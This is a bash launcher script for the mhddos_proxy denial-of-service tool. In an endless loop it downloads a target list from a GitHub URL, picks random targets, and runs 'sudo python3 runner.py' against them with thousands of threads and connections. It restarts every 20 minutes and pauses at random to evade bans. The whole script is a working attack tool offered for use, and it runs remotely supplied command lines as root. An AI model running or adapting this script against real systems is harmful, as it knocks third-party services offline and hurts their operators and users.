#!/bin/bash

restart_interval="20m"

ulimit -n 1048576


#Just in case kill previous copy of mhddos_proxy
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
sudo pkill -e -f runner.py
sudo pkill -e -f ./start.py
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"


num_of_copies="${1:-1}"
if (("$num_of_copies" == "all"));
	then	
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
		num_of_copies=3
	elif ((num_of_copies > 3));
	then 
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
		num_of_copies=3
	elif ((num_of_copies < 1));
	then
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
		num_of_copies=1
	else
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAttack will started with 1 parallel attack\033[0;0m\n"
		num_of_copies=1
fi
threads="${2:-1500}"
if ((threads < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
	threads=1000
elif ((threads > 6000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 6000 threads\033[0;0m\n"
	threads=6000
fi

rpc="${3:-1000}"
if ((rpc < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
	rpc=1000
elif ((rpc > 5000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc(connections)\033[0;0m\n"
	rpc=5000
fi

debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
	debug="--debug"
fi

echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
sleep 7s


# Restart attacks and update targets list every 10 minutes (by default)
while [ 1 == 1 ]
do	
	   	
	
   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_docker | cat | grep "^[^#]" | wc -l)
	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
   	if (("$num_of_copies" == "all"));
	then	
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies > list_size));
	then 
		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
		then
			random_numbers=$(shuf -i 1-$list_size -n 3)
		else
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
		fi
	elif ((num_of_copies < 1));
	then
		num_of_copies=1
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	else
		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
	fi
	
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
      
   	# Launch multiple mhddos_proxy instances with different targets.
   	for i in $random_numbers
   	do
            echo -e "\n I = $i"
            # Filter and only get lines that not start with "#". Then get one target from that filtered list.
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_docker | cat | grep "^[^#]")")
           

            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            echo "sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
            
            cd ~/mhddos_proxy
            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $rpc
            sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug&
            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   	done
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
   	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
   	sudo pkill -e -f runner.py
   	sudo pkill -e -f ./start.py
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
	
done
